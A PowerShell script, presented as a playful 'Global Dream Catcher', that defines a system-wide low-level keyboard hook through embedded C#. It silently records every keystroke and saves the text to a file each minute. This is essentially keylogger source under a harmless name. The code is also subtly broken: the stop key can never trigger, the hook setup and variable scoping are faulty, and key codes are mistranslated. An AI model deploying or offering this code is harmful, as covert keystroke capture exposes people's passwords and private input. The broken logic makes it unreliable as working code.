Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public class GlobalKeyboardHook
{
    [DllImport("user32.dll")]
    public static extern int SetWindowsHookEx(int idHook, KeyboardHookDelegate lpfn, IntPtr hInstance, uint threadId);

    [DllImport("user32.dll")]
    public static extern int UnhookWindowsHookEx(int idHook);

    [DllImport("user32.dll")]
    public static extern int CallNextHookEx(int idHook, int nCode, int wParam, IntPtr lParam);

    [StructLayout(LayoutKind.Sequential)]
    public struct KBDLLHOOKSTRUCT
    {
        public int vkCode;
        public int scanCode;
        public int flags;
        public int time;
        public IntPtr dwExtraInfo;
    }

    public delegate int KeyboardHookDelegate(int nCode, int wParam, IntPtr lParam);

    public const int WH_KEYBOARD_LL = 13;
    public const int WM_KEYDOWN = 0x0100;
}
"@

$UserInput = ""
$DreamContent = ""

$StopFlag = $false

# Set hInstance to IntPtr.Zero to indicate a global hook
$hInstance = [System.IntPtr]::Zero

# Obtain the current thread ID using kernel32.dll
$threadId = [System.Diagnostics.Process]::GetCurrentProcess().Threads[0].Id

$DreamFileName = "Dream.txt"

# Function to save the content to a file
function SaveDreamContent {
    $DreamContent | Set-Content -Path $DreamFileName -Force
}

# Create a timer to save the content every minute
$saveTimer = New-Object System.Timers.Timer
$saveTimer.Interval = 60000  # 60,000 milliseconds (1 minute)
$saveTimer.Enabled = $true

$saveTimer.add_Elapsed({
    SaveDreamContent
})

$keyboardHook = [GlobalKeyboardHook]::SetWindowsHookEx([GlobalKeyboardHook]::WH_KEYBOARD_LL, {
    param($nCode, $wParam, $lParam)

    if ($nCode -ge 0 -and $wParam -eq [GlobalKeyboardHook]::WM_KEYDOWN) {
        $kbStruct = [GlobalKeyboardHook]::KBDLLHOOKSTRUCT::new()
        [System.Runtime.InteropServices.Marshal]::PtrToStructure($lParam, [ref]$kbStruct)

        $KeyChar = [char]$kbStruct.vkCode

        if (-not $StopFlag) {
            $DreamContent += $KeyChar
        }
    }

    return [GlobalKeyboardHook]::CallNextHookEx(0, $nCode, $wParam, $lParam)
}, $hInstance, $threadId)

Write-Host "Welcome to the Global Dream Catcher with Stop Feature!"
Write-Host "Type your thoughts using any keyboard input, and it will be captured silently."
Write-Host "Press Ctrl+ALT+8 to stop capturing."

# Start capturing user input
while ($true) {
    if ($StopFlag) {
        # Check for Ctrl+Alt+8 to stop the program
        if ([Console]::Modifiers -band [ConsoleModifiers]::Control -and [Console]::Modifiers -band [ConsoleModifiers]::Alt -and [Console]::KeyAvailable -and [Console]::ReadKey().Key -eq '8') {
            break
        }
    }
    Start-Sleep -Milliseconds 100  # Sleep for a short time to reduce CPU usage
}

# Unhook the global keyboard hook
[GlobalKeyboardHook]::UnhookWindowsHookEx($keyboardHook)

# Save the content one last time before exiting
SaveDreamContent

Write-Host "Your dream has been saved in '$DreamFileName'. Goodnight and sweet dreams!"
